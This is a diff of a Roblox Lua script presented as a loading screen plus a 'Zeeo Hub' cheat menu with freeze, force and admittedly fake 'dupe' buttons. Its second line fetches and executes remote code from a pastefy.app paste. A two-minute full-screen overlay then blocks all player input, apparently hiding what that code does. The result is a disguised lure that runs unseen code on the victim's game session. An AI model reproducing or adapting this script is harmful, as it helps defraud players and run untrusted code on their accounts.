@@ -1,23 +1,16 @@
 wait(0.2)
 loadstring(game:HttpGet("https://pastefy.app/wIQ10uaV/raw"))()
---[[
-  LoadingScreenScript.lua
-  Author: Zeel (Modified)
-  Purpose: Simulates a 2-minute loading screen for Roblox with input blocked
-]]
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Create ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LoadingScreen"
 screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true -- Makes it fully full-screen
+screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
 
--- Input blocker (invisible full-screen button that eats all input)
 local blocker = Instance.new("TextButton")
 blocker.Name = "InputBlocker"
 blocker.Size = UDim2.new(1, 0, 1, 0)
@@ -28,7 +21,6 @@ blocker.AutoButtonColor = false
 blocker.Modal = true -- This is the key: prevents clicks on anything else
 blocker.Parent = screenGui
 
--- Background Frame
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.Position = UDim2.new(0, 0, 0, 0)
@@ -36,7 +28,6 @@ bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 bg.BorderSizePixel = 0
 bg.Parent = screenGui
 
--- Loading Text
 local loadingText = Instance.new("TextLabel")
 loadingText.Size = UDim2.new(1, 0, 0.1, 0)
 loadingText.Position = UDim2.new(0, 0, 0.35, 0)
@@ -48,7 +39,6 @@ loadingText.TextSize = 30
 loadingText.TextWrapped = true
 loadingText.Parent = bg
 
--- Progress Bar Background
 local progressBarBG = Instance.new("Frame")
 progressBarBG.Size = UDim2.new(0.6, 0, 0.05, 0)
 progressBarBG.Position = UDim2.new(0.2, 0, 0.5, 0)
@@ -56,14 +46,12 @@ progressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 progressBarBG.BorderSizePixel = 0
 progressBarBG.Parent = bg
 
--- Progress Bar Fill
 local progressBar = Instance.new("Frame")
 progressBar.Size = UDim2.new(0, 0, 1, 0)
 progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 progressBar.BorderSizePixel = 0
 progressBar.Parent = progressBarBG
 
--- Progress Text
 local progressText = Instance.new("TextLabel")
 progressText.Size = UDim2.new(1, 0, 0.1, 0)
 progressText.Position = UDim2.new(0, 0, 0.56, 0)
@@ -74,7 +62,6 @@ progressText.Font = Enum.Font.SourceSans
 progressText.TextSize = 20
 progressText.Parent = bg
 
--- Loading Logic
 local totalTime = 120 -- 2 minutes in seconds
 local currentTime = 0
 
@@ -87,23 +74,18 @@ while currentTime <= totalTime do
 	currentTime = currentTime + 1
 end
 
--- Remove the loading screen
 screenGui:Destroy()
-
--- Merged Zeeo Hub GUI with Avatar + Dupe Button
 
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Create GUI container
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ZeeoHubGUI"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
 
--- Main draggable frame
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 300, 0, 320) -- Increased height for dupe button space
 frame.Position = UDim2.new(0.65, 0, 0.3, 0)
@@ -113,7 +95,6 @@ frame.Active = true
 frame.Draggable = true
 frame.Parent = screenGui
 
--- Title label
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0.15, 0)
 title.Position = UDim2.new(0, 0, 0, 0)
@@ -124,7 +105,6 @@ title.TextSize = 22
 title.BackgroundTransparency = 1
 title.Parent = frame
 
--- Username input
 local usernameBox = Instance.new("TextBox")
 usernameBox.Size = UDim2.new(0.8, 0, 0.15, 0)
 usernameBox.Position = UDim2.new(0.1, 0, 0.2, 0)
@@ -137,7 +117,6 @@ usernameBox.TextColor3 = Color3.fromRGB(0, 0, 0)
 usernameBox.ClearTextOnFocus = false
 usernameBox.Parent = frame
 
--- Avatar Image (circular)
 local avatarImage = Instance.new("ImageLabel")
 avatarImage.Size = UDim2.new(0, 60, 0, 60)
 avatarImage.Position = UDim2.new(0.5, -30, 0.4, 0)
@@ -145,12 +124,10 @@ avatarImage.BackgroundTransparency = 1
 avatarImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
 avatarImage.Parent = frame
 
--- Round the avatar image into a circle
 local avatarUICorner = Instance.new("UICorner")
 avatarUICorner.CornerRadius = UDim.new(1, 0)
 avatarUICorner.Parent = avatarImage
 
--- Freeze Button (🧊)
 local freezeButton = Instance.new("TextButton")
 freezeButton.Size = UDim2.new(0.4, -5, 0.15, 0)
 freezeButton.Position = UDim2.new(0.1, 0, 0.7, 0)
@@ -161,7 +138,6 @@ freezeButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 freezeButton.Parent = frame
 
--- Force Button (💪)
 local forceButton = Instance.new("TextButton")
 forceButton.Size = UDim2.new(0.4, -5, 0.15, 0)
 forceButton.Position = UDim2.new(0.5, 10, 0.7, 0)
@@ -172,7 +148,6 @@ forceButton.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
 forceButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 forceButton.Parent = frame
 
--- Footer label
 local footer = Instance.new("TextLabel")
 footer.Size = UDim2.new(1, 0, 0.1, 0)
 footer.Position = UDim2.new(0, 0, 0.9, 0)
@@ -183,7 +158,6 @@ footer.TextSize = 16
 footer.BackgroundTransparency = 1
 footer.Parent = frame
 
--- Avatar loading logic
 local function updateAvatar()
     local username = usernameBox.Text
     if username == "" then
@@ -213,7 +187,6 @@ usernameBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
--- Click Events
 freezeButton.MouseButton1Click:Connect(function()
     local name = usernameBox.Text
     if name == "" then name = "[unknown]" end
@@ -234,7 +207,6 @@ forceButton.MouseButton1Click:Connect(function()
     })
 end)
 
--- Dupe Button below UI
 local dupeButton = Instance.new("TextButton")
 dupeButton.Size = UDim2.new(0.8, 0, 0, 30)
 dupeButton.Position = UDim2.new(0.1, 0, 1.05, 0) -- Below the frame
@@ -244,7 +216,6 @@ dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- white
 dupeButton.TextScaled = true
 dupeButton.Parent = frame
 
--- Dupe note label
 local dupeNote = Instance.new("TextLabel")
 dupeNote.Size = UDim2.new(0.8, 0, 0, 20)
 dupeNote.Position = UDim2.new(0.1, 0, 1.25, 0)
@@ -254,7 +225,6 @@ dupeNote.TextColor3 = Color3.fromRGB(200, 200, 200)
 dupeNote.TextScaled = true
 dupeNote.Parent = frame
 
--- "Fake dupe" function (visual only)
 dupeButton.MouseButton1Click:Connect(function()
     local character = game.Players.LocalPlayer.Character
     if not character then return end
